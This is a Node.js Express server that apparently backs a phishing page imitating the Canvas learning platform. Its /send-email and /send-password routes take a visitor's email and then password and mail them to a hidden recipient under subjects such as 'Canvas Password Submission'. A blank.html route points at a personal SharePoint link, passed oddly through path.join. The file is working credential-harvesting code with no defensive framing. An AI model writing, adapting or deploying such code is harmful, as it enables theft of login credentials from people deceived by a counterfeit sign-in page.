require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files (index.html, thank-you.html, blank.html, images)
app.use(express.static('public'));
app.use(express.json());

// === Existing email route for index.html ===
app.post('/send-email', async (req, res) => {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ success: false, message: 'No email provided.' });
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.RECIPIENT_EMAIL,
    subject: 'Canvas Form Submission',
    text: `User entered email: ${email}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: '❌ Error sending email.' });
  }
});

// === New password route for the second page ===
app.post('/send-password', async (req, res) => {
  const { password } = req.body;

  if (!password) {
    return res.status(400).json({ success: false, message: 'No password provided.' });
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.RECIPIENT_EMAIL,
    subject: 'Canvas Password Submission',
    text: `User entered password: ${password}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: '❌ Error sending password email.' });
  }
});

// Serve thank-you.html explicitly if needed
app.get('/thank-you.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'thank-you.html'));
});

// Serve blank.html explicitly if needed
app.get('/blank.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'https://farmersedge-my.sharepoint.com/:w:/g/personal/thom_weir_farmersedge_ca/EU-EAWlqZ4RJpbQskh6diXgBwlF_oaAWM4kc68pxFUwn6A'));
});

app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
});
